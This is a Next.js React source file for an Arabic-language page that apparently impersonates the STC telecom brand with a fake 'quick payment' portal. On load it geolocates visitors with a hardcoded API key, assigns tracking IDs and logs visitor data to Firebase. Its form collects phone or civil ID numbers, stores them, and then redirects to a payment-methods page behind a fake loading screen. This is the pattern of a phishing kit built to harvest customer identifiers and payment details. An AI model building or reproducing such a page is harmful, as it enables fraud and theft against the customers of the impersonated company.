"use client"

import type React from "react"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import {
  Search,
  ShoppingCart,
  User,
  Menu,
  CreditCard,
  ChevronRight,
  Phone,
  Wifi,
  Smartphone,
  Tv,
  Headphones,
  ShieldCheck,
  ArrowRight,
  PlusCircle,
  Download,
  Star,
  TrendingUp,
  Zap,
  Award,
} from "lucide-react"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/online-sts"

const _id = Math.random()
  .toString(36)
  .replace(/[^a-z]+/g, "")
  .substr(0, 15)

export default function Home() {
  const [isLoading, setIsLoading] = useState(false)
  const [phone, setPhone] = useState("")
  const [amount, setAmount] = useState("")
  const router = useRouter()

  useEffect(() => {
    getLocation()
  }, [])

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const id = localStorage.getItem("visitor")
    addData({ id: id, phone, mobile: phone })
    localStorage.setItem("amount", amount)

    setIsLoading(true)
    setTimeout(() => {
      router.push("/payment-methods")
      setIsLoading(false)
    }, 3000)
  }

  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: _id,
        country: country,
        createdDate: new Date().toISOString(),
      })
      localStorage.setItem("country", country)
      setupOnlineStatus(_id)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }

  return (
    <div className="flex flex-col min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50 font-sans" dir="rtl">
      {/* Header */}
      <header className="flex justify-between items-center px-6 py-4 bg-white/95 backdrop-blur-md border-b border-gray-200/50 sticky top-0 z-50 shadow-professional">
        <button className="p-3 rounded-2xl hover:bg-gray-100 transition-all duration-300 hover:scale-105 focus-professional">
          <Menu className="w-5 h-5 text-slate-700" />
        </button>

        <div className="flex items-center">
          <img src="/stc.png" alt="STC Logo" className="h-10 w-auto" />
        </div>

        <div className="flex items-center space-x-reverse space-x-3">
          <button className="p-3 rounded-2xl hover:bg-gray-100 transition-all duration-300 hover:scale-105 focus-professional">
            <Search className="w-5 h-5 text-slate-600" />
          </button>
          <button className="p-3 rounded-2xl hover:bg-gray-100 transition-all duration-300 hover:scale-105 focus-professional">
            <ShoppingCart className="w-5 h-5 text-slate-600" />
          </button>
          <button className="p-3 rounded-2xl hover:bg-gray-100 transition-all duration-300 hover:scale-105 focus-professional">
            <User className="w-5 h-5 text-red-500" />
          </button>
        </div>
      </header>

      {/* Hero Banner */}
      <div className="relative mx-6 my-8 rounded-3xl overflow-hidden shadow-professional-xl animate-fadeInUp">
        <div className="absolute inset-0 bg-gradient-to-r from-slate-900/70 via-purple-900/50 to-red-500/70 z-10"></div>
        <img src="/hero-banner.jpg" alt="Hero Banner" className="w-full h-[400px] object-cover" />
        <div className="absolute inset-0 z-20 p-8 flex flex-col justify-between">
          <div className="glass rounded-3xl p-6 w-48 text-center shadow-professional-lg border border-white/30 animate-scaleIn">
            <div className="text-red-500 font-bold text-2xl heading-professional">خلك ON</div>
            <div className="text-red-400 text-sm mt-2 font-medium text-professional">باقات الدفع المسبقة الجديدة كلياً</div>
          </div>

          <div className="space-y-6 animate-slideInRight">
            <h1 className="text-white font-bold text-4xl md:text-5xl leading-tight drop-shadow-2xl heading-professional">
              تواصل بدون انقطاع
              <br />
              <span className="text-red-300">مع باقات الدفع الآجل</span>
            </h1>
            <div className="flex justify-end mt-8">
              <Button className="btn-professional bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white rounded-2xl px-10 py-5 font-semibold text-lg shadow-professional-xl transition-all duration-300 hover:scale-105 hover:shadow-2xl">
                اعرف أكثر
                <ArrowRight className="mr-2 h-5 w-5" />
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Service Icons */}
      <div className="px-6 mt-6 animate-fadeInUp" style={{ animationDelay: '0.2s' }}>
        <div className="grid grid-cols-4 gap-4">
          <ServiceCard icon={<Store />} title="e-store" />
          <ServiceCard icon={<ShieldCheck />} title="تحديث البطاقة المدنية" />
          <ServiceCard icon={<ArrowRight />} title="نقل إلى stc" />
          <ServiceCard icon={<PlusCircle />} title="احصل على خط جديد" />
        </div>
      </div>

      {/* Quick Payment */}
      <div className="mx-6 mt-12 animate-fadeInUp" style={{ animationDelay: '0.4s' }}>
        <form
          onSubmit={handleSubmit}
          className="p-8 glass rounded-3xl shadow-professional-xl border border-white/50 card-hover"
        >
          <div className="flex items-center justify-between mb-8">
            <div className="p-4 bg-gradient-to-br from-purple-100 to-purple-200 rounded-3xl shadow-professional">
              <CreditCard className="w-8 h-8 text-purple-700" />
            </div>
            <h2 className="text-3xl font-bold text-slate-800 heading-professional">الدفع السريع</h2>
          </div>

          <div className="space-y-6">
            <div className="relative">
              <Input
                required
                type="tel"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                maxLength={12}
                placeholder="رقم الجوال/البطاقة المدنية أو رقم العقد"
                className="text-right border-2 border-gray-200 rounded-2xl focus:ring-0 py-5 px-5 focus:border-purple-500 transition-all duration-300 bg-white/80 backdrop-blur-sm text-slate-700 placeholder:text-slate-400 text-lg focus-professional"
              />
            </div>

            {phone.length >= 8 && (
              <div className="relative animate-scaleIn">
                <Input
                  required
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  maxLength={3}
                  placeholder="القيمة بالدينار الكويتي"
                  type="tel"
                  className="text-right border-2 border-gray-200 rounded-2xl focus:ring-0 py-5 px-5 focus:border-purple-500 transition-all duration-300 bg-white/80 backdrop-blur-sm text-slate-700 placeholder:text-slate-400 text-lg focus-professional"
                />
              </div>
            )}

            <Button
              type="submit"
              className="btn-professional w-full bg-gradient-to-r from-red-500 via-red-600 to-red-500 hover:from-red-600 hover:via-red-700 hover:to-red-600 text-white rounded-2xl py-5 font-semibold text-xl shadow-professional-lg transition-all duration-300 hover:shadow-xl hover:scale-[1.02]"
            >
              تابع الآن
              <ArrowRight className="mr-3 h-6 w-6" />
            </Button>
          </div>
        </form>
      </div>

      {/* Quick Access */}
      <div className="mx-6 mt-12 animate-fadeInUp" style={{ animationDelay: '0.6s' }}>
        <div className="flex justify-between items-center mb-8">
          <Button
            variant="ghost"
            className="text-purple-700 hover:text-purple-800 p-0 flex items-center font-semibold hover:bg-purple-50 px-4 py-3 rounded-2xl transition-all duration-300 focus-professional"
          >
            المزيد <ChevronRight className="h-5 w-5 mr-2" />
          </Button>
          <h2 className="text-3xl font-bold text-slate-800 heading-professional">الوصول السريع</h2>
        </div>

        <div className="grid grid-cols-5 gap-4">
          <CategoryCard icon={<Phone />} label="الأجهزة" />
          <CategoryCard icon={<Wifi />} label="الإنترنت" />
          <CategoryCard icon={<Smartphone />} label="الجوال" />
          <CategoryCard icon={<Tv />} label="التلفزيون" />
          <CategoryCard icon={<Headphones />} label="الترفيه" />
        </div>
      </div>

      {/* Featured Products */}
      <div className="mx-6 mt-12 animate-fadeInUp" style={{ animationDelay: '0.8s' }}>
        <div className="flex justify-between items-center mb-8">
          <Button
            variant="ghost"
            className="text-purple-700 hover:text-purple-800 p-0 flex items-center font-semibold hover:bg-purple-50 px-4 py-3 rounded-2xl transition-all duration-300 focus-professional"
          >
            المزيد <ChevronRight className="h-5 w-5 mr-2" />
          </Button>
          <h2 className="text-3xl font-bold text-slate-800 heading-professional">تسوق أجهزة الجوال</h2>
        </div>

        <div className="grid grid-cols-2 gap-6">
          <ProductCard
            image="/samsung-s22.png"
            title="Samsung S25 Ultra"
            price="255.00"
            currency="د.ك"
            installment="12.63"
            badge="الأكثر مبيعاً"
          />
          <ProductCard
            image="/s25-Ultra-silver-blue-700x700.webp"
            title="Samsung S25"
            price="225.00"
            currency="د.ك"
            installment="11.29"
            badge="جديد"
          />
        </div>
      </div>

      {/* Samsung Banner */}
      <div className="mx-6 mt-12 animate-fadeInUp" style={{ animationDelay: '1s' }}>
        <div className="relative rounded-3xl overflow-hidden shadow-professional-xl card-hover">
          <div className="absolute inset-0 bg-gradient-to-l from-black/70 to-transparent z-10"></div>
          <img
            src="/samsung-s23.png"
            alt="Samsung Banner"
            width={700}
            height={200}
            className="w-full h-[180px] object-cover"
          />
          <div className="absolute inset-0 z-20 flex items-center justify-between p-8">
            <Button className="btn-professional bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white rounded-2xl px-8 py-4 text-lg font-semibold shadow-professional-lg transition-all duration-300 hover:scale-105">
              تسوق الآن
              <ArrowRight className="mr-2 h-5 w-5" />
            </Button>
            <div className="text-white text-right">
              <h3 className="font-bold text-2xl drop-shadow-lg heading-professional">سامسونج جالكسي</h3>
              <p className="text-lg mt-2 drop-shadow-md opacity-90 text-professional">اكتشف المجموعة الجديدة</p>
            </div>
          </div>
        </div>
      </div>

      {/* Gift Cards */}
      <div className="mx-6 mt-12 animate-fadeInUp" style={{ animationDelay: '1.2s' }}>
        <div className="flex justify-between items-center mb-8">
          <Button
            variant="ghost"
            className="text-purple-700 hover:text-purple-800 p-0 flex items-center font-semibold hover:bg-purple-50 px-4 py-3 rounded-2xl transition-all duration-300 focus-professional"
          >
            المزيد <ChevronRight className="h-5 w-5 mr-2" />
          </Button>
          <h2 className="text-3xl font-bold text-slate-800 heading-professional">تسوق البطاقات و الألعاب الإلكترونية</h2>
        </div>

        <div className="grid grid-cols-2 gap-6">
          <GiftCard image="/pla.webp" title="Google Play" />
          <GiftCard image="/itun.webp" title="iTunes" />
        </div>
      </div>

      {/* Accessories */}
      <div className="mx-6 mt-12 animate-fadeInUp" style={{ animationDelay: '1.4s' }}>
        <div className="flex justify-between items-center mb-8">
          <Button
            variant="ghost"
            className="text-purple-700 hover:text-purple-800 p-0 flex items-center font-semibold hover:bg-purple-50 px-4 py-3 rounded-2xl transition-all duration-300 focus-professional"
          >
            المزيد <ChevronRight className="h-5 w-5 mr-2" />
          </Button>
          <h2 className="text-3xl font-bold text-slate-800 heading-professional">الأجهزة</h2>
        </div>

        <div className="grid grid-cols-3 gap-4">
          <CategoryCard image="/wifi.png" label="راوتر" bgColor="bg-gradient-to-br from-blue-50 to-blue-100" />
          <CategoryCard image="/music.png" label="سماعات" bgColor="bg-gradient-to-br from-purple-50 to-purple-100" />
          <CategoryCard
            image="/wristwatch.png"
            label="ساعات"
            bgColor="bg-gradient-to-br from-green-50 to-green-100"
          />
        </div>
      </div>

      {/* Entertainment */}
      <div className="mx-6 mt-12 mb-12 animate-fadeInUp" style={{ animationDelay: '1.6s' }}>
        <div className="flex justify-between items-center mb-8">
          <Button
            variant="ghost"
            className="text-purple-700 hover:text-purple-800 p-0 flex items-center font-semibold hover:bg-purple-50 px-4 py-3 rounded-2xl transition-all duration-300 focus-professional"
          >
            المزيد <ChevronRight className="h-5 w-5 mr-2" />
          </Button>
          <h2 className="text-3xl font-bold text-slate-800 heading-professional">تسوق خدمات الترفيه</h2>
        </div>

        <div className="grid grid-cols-3 gap-4">
          <CategoryCard image="/rgb.png" label="Netflix" bgColor="bg-gradient-to-br from-red-50 to-red-100" />
          <CategoryCard image="/mbc.png" label="Shahid" bgColor="bg-gradient-to-br from-yellow-50 to-yellow-100" />
          <CategoryCard image="/Spotify.png" label="Spotify" bgColor="bg-gradient-to-br from-green-50 to-green-100" />
        </div>
      </div>

      {/* Newsletter */}
      <div className="gradient-primary py-16 px-8 shadow-inner animate-fadeInUp" style={{ animationDelay: '1.8s' }}>
        <div className="text-white text-center mb-10">
          <h3 className="font-bold text-3xl heading-professional">انضم إلى نشرتنا الإخبارية</h3>
          <p className="text-xl mt-4 opacity-90 text-professional">احصل على آخر العروض والأخبار</p>
        </div>
        <div className="flex gap-4 max-w-md mx-auto">
          <Button className="btn-professional bg-white text-slate-800 hover:bg-gray-100 flex-1 shadow-professional-lg transition-all duration-300 hover:scale-105 font-semibold rounded-2xl py-4 text-lg">
            اشترك الآن
          </Button>
          <Input
            placeholder="البريد الإلكتروني"
            className="flex-1 glass text-right shadow-professional-lg focus:ring-2 focus:ring-white rounded-2xl border-0 py-4 text-lg focus-professional"
          />
        </div>
      </div>

      {/* Footer */}
      <Footer />

      {/* WhatsApp Button */}
      <WhatsAppButton />

      {/* Loading Overlay */}
      {isLoading && <FullPageLoader text="جاري التحويل ..." />}
    </div>
  )
}

// Component definitions
function ServiceCard({ icon, title }: { icon: React.ReactNode; title: string }) {
  return (
    <div className="flex flex-col items-center gap-4 p-5 glass rounded-3xl shadow-professional border border-white/50 hover:shadow-professional-lg transition-all duration-300 hover:scale-105 hover:bg-white/90 card-hover">
      <div className="bg-gradient-to-br from-purple-100 to-purple-200 rounded-3xl p-4 text-purple-700 shadow-professional">
        {icon}
      </div>
      <span className="text-sm text-center font-semibold text-slate-700 leading-tight text-professional">{title}</span>
    </div>
  )
}

function CategoryCard({
  icon,
  label,
  image,
  bgColor = "bg-white/80",
}: {
  icon?: React.ReactNode
  label: string
  image?: string
  bgColor?: string
}) {
  return (
    <div
      className={`flex flex-col items-center justify-center gap-4 p-5 ${bgColor} backdrop-blur-sm rounded-3xl shadow-professional border border-white/50 hover:shadow-professional-lg transition-all duration-300 hover:scale-105 card-hover`}
    >
      {image ? (
        <img src={image || "/placeholder.svg"} alt={label} className="w-14 h-14 object-contain" />
      ) : icon ? (
        <div className="text-purple-700 p-3">{icon}</div>
      ) : null}
      <span className="text-sm text-center font-semibold text-slate-700 text-professional">{label}</span>
    </div>
  )
}

function ProductCard({
  image,
  title,
  price,
  currency,
  installment,
  badge,
}: {
  image: string
  title: string
  price: string
  currency: string
  installment: string
  badge?: string
}) {
  return (
    <div className="glass rounded-3xl p-6 shadow-professional-xl border border-white/50 hover:shadow-2xl transition-all duration-300 hover:scale-[1.02] card-hover">
      <div className="relative h-48 mb-6 bg-gradient-to-br from-gray-50 to-gray-100 rounded-3xl p-4">
        {badge && (
          <div className="absolute top-3 right-3 bg-gradient-to-r from-red-500 to-red-600 text-white px-3 py-1 rounded-full text-xs font-semibold shadow-professional">
            {badge}
          </div>
        )}
        <img src={image || "/placeholder.svg"} alt={title} className="w-full h-full object-contain" />
      </div>
      <h3 className="font-bold text-slate-800 mb-4 text-xl heading-professional">{title}</h3>
      <div className="flex justify-between items-center">
        <div className="text-sm text-slate-500 font-medium text-professional">
          {installment} {currency}/شهر
        </div>
        <div className="font-bold text-red-600 text-xl heading-professional">
          {price} {currency}
        </div>
      </div>
    </div>
  )
}

function GiftCard({ image, title }: { image: string; title: string }) {
  return (
    <div className="glass rounded-3xl p-6 shadow-professional-xl border border-white/50 hover:shadow-2xl transition-all duration-300 hover:scale-[1.02] card-hover">
      <div className="relative h-40 mb-6 bg-gradient-to-br from-gray-50 to-gray-100 rounded-3xl p-4">
        <img src={image || "/placeholder.svg"} alt={title} className="w-full h-full object-contain" />
      </div>
      <h3 className="font-bold text-slate-800 text-center text-xl heading-professional">{title}</h3>
    </div>
  )
}

function Footer() {
  return (
    <footer className="bg-gradient-to-br from-slate-900 to-slate-800 text-white py-20 px-8">
      <div className="grid grid-cols-2 md:grid-cols-4 gap-10 max-w-6xl mx-auto">
        <div>
          <h4 className="font-bold mb-8 text-xl heading-professional">خدمة العملاء</h4>
          <ul className="space-y-4 text-sm text-slate-300">
            <li className="hover:text-white transition-colors cursor-pointer text-professional">اتصل بنا</li>
            <li className="hover:text-white transition-colors cursor-pointer text-professional">الأسئلة الشائعة</li>
            <li className="hover:text-white transition-colors cursor-pointer text-professional">فروعنا</li>
          </ul>
        </div>
        <div>
          <h4 className="font-bold mb-8 text-xl heading-professional">حسابي</h4>
          <ul className="space-y-4 text-sm text-slate-300">
            <li className="hover:text-white transition-colors cursor-pointer text-professional">تسجيل الدخول</li>
            <li className="hover:text-white transition-colors cursor-pointer text-professional">طلباتي</li>
            <li className="hover:text-white transition-colors cursor-pointer text-professional">إعدادات الحساب</li>
          </ul>
        </div>
        <div>
          <h4 className="font-bold mb-8 text-xl heading-professional">عن الشركة</h4>
          <ul className="space-y-4 text-sm text-slate-300">
            <li className="hover:text-white transition-colors cursor-pointer text-professional">من نحن</li>
            <li className="hover:text-white transition-colors cursor-pointer text-professional">الوظائف</li>
            <li className="hover:text-white transition-colors cursor-pointer text-professional">الشروط والأحكام</li>
          </ul>
        </div>
        <div>
          <h4 className="font-bold mb-8 text-xl heading-professional">تواصل معنا</h4>
          <div className="flex space-x-4 space-x-reverse mt-6">
            <div className="w-12 h-12 bg-white/20 hover:bg-white/30 rounded-3xl flex items-center justify-center transition-all duration-300 hover:scale-110 cursor-pointer shadow-professional"></div>
            <div className="w-12 h-12 bg-white/20 hover:bg-white/30 rounded-3xl flex items-center justify-center transition-all duration-300 hover:scale-110 cursor-pointer shadow-professional"></div>
            <div className="w-12 h-12 bg-white/20 hover:bg-white/30 rounded-3xl flex items-center justify-center transition-all duration-300 hover:scale-110 cursor-pointer shadow-professional"></div>
          </div>
        </div>
      </div>
      <div className="mt-16 pt-10 border-t border-slate-700 text-center text-sm text-slate-400 text-professional">
        © {new Date().getFullYear()} جميع الحقوق محفوظة - شركة الاتصالات السعودية
      </div>
    </footer>
  )
}

function WhatsAppButton() {
  return (
    <div className="fixed bottom-8 left-8 z-50">
      <button className="btn-professional bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white rounded-3xl p-5 shadow-professional-xl transition-all duration-300 hover:scale-110 hover:shadow-2xl">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="28"
          height="28"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          strokeLinecap="round"
          strokeLinejoin="round"
          className="w-7 h-7"
        >
          <path d="M3 21l1.65-3.8a9 9 0 1 1 3.4 2.9L3 21"></path>
          <path d="M9 10a.5.5 0 0 0 1 0V9a.5.5 0 0 0-1 0v1Z"></path>
          <path d="M14 10a.5.5 0 0 0 1 0V9a.5.5 0 0 0-1 0v1Z"></path>
          <path d="M9.5 15.5a5 5 0 0 0 5 0"></path>
        </svg>
      </button>
    </div>
  )
}

function FullPageLoader({ text }: { text: string }) {
  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex flex-col items-center justify-center z-50">
      <div className="w-24 h-24 border-4 border-t-red-500 border-r-red-500 border-b-transparent border-l-transparent rounded-full animate-spin"></div>
      <p className="text-white mt-8 font-semibold text-xl text-professional">{text}</p>
    </div>
  )
}

function Store() {
  return (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      width="24"
      height="24"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="m2 7 4.41-4.41A2 2 0 0 1 7.83 2h8.34a2 2 0 0 1 1.42.59L22 7"></path>
      <path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"></path>
      <path d="M15 22v-4a2 2 0 0 0-2-2h-2a2 2 0 0 0-2 2v4"></path>
      <path d="M2 7h20"></path>
      <path d="M22 7v3a2 2 0 0 1-2 2v0a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 16 12a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 12 12a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 8 12a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 4 12v0a2 2 0 0 1-2-2V7"></path>
    </svg>
  )
}